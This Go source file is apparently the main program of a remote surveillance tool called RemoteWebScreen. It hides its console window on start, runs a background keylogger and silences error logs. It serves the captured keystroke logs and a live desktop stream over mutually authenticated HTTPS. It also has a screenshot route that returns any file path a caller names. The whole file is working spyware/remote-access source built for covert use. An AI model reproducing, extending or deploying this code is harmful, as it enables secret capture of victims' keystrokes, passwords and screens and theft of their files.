package main

import (
	"RemoteWebScreen/keyboard"
	"RemoteWebScreen/server"
	"RemoteWebScreen/win32"
	"crypto/tls"
	"crypto/x509"
	"embed"
	"fmt"
	"html/template"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

//go:embed  index.html static/*
//go:embed certs/server.key certs/server.pem certs/ca.pem
var templates embed.FS

type PageData struct {
	LogContent string
}

func init() {
	win32.HideConsole()
}

// 自定义 logger，过滤 TLS handshake error
type filteredLogger struct {
	logger *log.Logger
}

func (fl *filteredLogger) Write(p []byte) (n int, err error) {
	msg := string(p)
	// 过滤掉 TLS handshake error
	if strings.Contains(msg, "TLS handshake error") {
		return len(p), nil
	}
	return fl.logger.Writer().Write(p)
}

func printBanner() {
	banner := `
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   ██████╗ ███████╗███╗   ███╗ ██████╗ ████████╗███████╗     	║
║   ██╔══██╗██╔════╝████╗ ████║██╔═══██╗╚══██╔══╝██╔════╝     	║
║   ██████╔╝█████╗  ██╔████╔██║██║   ██║   ██║   █████╗      	║
║   ██╔══██╗██╔══╝  ██║╚██╔╝██║██║   ██║   ██║   ██╔══╝       	║
║   ██║  ██║███████╗██║ ╚═╝ ██║╚██████╔╝   ██║   ███████╗     	║
║   ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝    ╚═╝   ╚══════╝     	║
║                                                               ║
║     	   RemoteWebScreen       Author: p1d3er      	        ║
╚═══════════════════════════════════════════════════════════════╝
`
	fmt.Println(banner)
	fmt.Println("服务启动...")
	fmt.Println()
}

func main() {
	// 设置自定义 logger，过滤 TLS handshake error
	customLogger := &filteredLogger{
		logger: log.New(os.Stdout, "", log.LstdFlags),
	}
	log.SetOutput(customLogger)

	
	listenAddress := ":443"
	if len(os.Args) == 1 {
		os.Exit(0)
	} else if len(os.Args) == 2 && os.Args[1] == "start" {
	} else if len(os.Args) == 3 && os.Args[1] == "start" {
		listenAddress = fmt.Sprintf(":%s", os.Args[2])
	} else {
		os.Exit(0)
	}
	printBanner()
	certData, _ := templates.ReadFile("certs/server.pem")
	keyData, _ := templates.ReadFile("certs/server.key")
	caCert, err := templates.ReadFile("certs/ca.pem")
	certPool := x509.NewCertPool()
	certPool.AppendCertsFromPEM(caCert)
	cert, err := tls.X509KeyPair(certData, keyData)
	if err != nil {
		//log.Fatalf("Failed to load key pair: %v", err)
	}
	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{cert},
		ClientCAs:    certPool,
		ClientAuth:   tls.RequireAndVerifyClientCert,
	}
	SimulateDesktopConfig := &tls.Config{
		Certificates: []tls.Certificate{cert},
	}
	SimulateDesktopListener, err := tls.Listen("tcp", ":0", SimulateDesktopConfig)
	if err != nil {
		//log.Printf("Failed to listen on a random port: %v", err)
	}
	httpsListener, err := tls.Listen("tcp", listenAddress, tlsConfig)
	if err != nil {
		//log.Fatalf("Failed to create TLS listener: %v", err)
	}
	SimulateDesktopwsPort := SimulateDesktopListener.Addr().(*net.TCPAddr).Port
	go keyboard.Keylog()

	http.HandleFunc("/"+listenAddress, func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		contentBytes, err := templates.ReadFile("index.html")
		if err != nil {
			//log.Printf("contentBytes, err := templates.ReadFile(index.html): %v", err)
		}
		tmpl, err := template.New("index").Parse(string(contentBytes))
		if err != nil {
			//log.Printf("tmpl, err := template.New(index).Parse(string(contentBytes)): %v", err)
		}
		tmpl.Execute(w, map[string]interface{}{
			"WebSocketPort": SimulateDesktopwsPort,
		})
	})
	fs := http.FS(templates)
	http.Handle("/static/", http.StripPrefix("/", http.FileServer(fs)))
	//http.Handle("/", http.FileServer(http.Dir(keyboard.Screen_logPath)))
	http.HandleFunc("/"+listenAddress+"log", func(w http.ResponseWriter, r *http.Request) {
		filePath := filepath.Join(keyboard.Screen_logPath, keyboard.Logfilename)
		content, err := ioutil.ReadFile(filePath)
		if err != nil {
		}
		data := PageData{
			LogContent: string(content),
		}
		tmpl, err := template.New("log").Parse(win32.HtmlTemplate)
		err = tmpl.Execute(w, data)
		if err != nil {
			//http.Error(w, "Error executing HTML template", http.StatusInternalServerError)
		}
	})
	// 添加截屏图片访问路由
	http.HandleFunc("/screenshot", func(w http.ResponseWriter, r *http.Request) {
		imagePath := r.URL.Query().Get("path")
		if imagePath == "" {
			http.Error(w, "Missing path parameter", http.StatusBadRequest)
			return
		}
		// 读取图片文件
		imageData, err := ioutil.ReadFile(imagePath)
		if err != nil {
			http.Error(w, "Image not found", http.StatusNotFound)
			return
		}
		// 设置响应头
		w.Header().Set("Content-Type", "image/png")
		w.Write(imageData)
	})
	go func() {
		// 创建自定义 HTTP 服务器，设置 ErrorLog
		httpsServer := &http.Server{
			Handler:  nil,
			ErrorLog: log.New(io.Discard, "", 0), // 禁用错误日志
		}
		if err := httpsServer.Serve(httpsListener); err != nil {
			//log.Fatalf("Failed to start HTTPS server: %v", err)
		}
	}()
	go func() {
		http.HandleFunc("/SimulateDesktop", server.ScreenshotHandler)
	}()

	// 创建 WebSocket 服务器，设置 ErrorLog
	wsServer := &http.Server{
		Handler:  nil,
		ErrorLog: log.New(io.Discard, "", 0), // 禁用错误日志
	}

	go func() {
		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()
		for {
			<-ticker.C
			server.CleanupConnections()
		}
	}()

	if err := wsServer.Serve(SimulateDesktopListener); err != nil {
		//log.Printf("Failed to start WebSocket server: %v", err)
	}
}
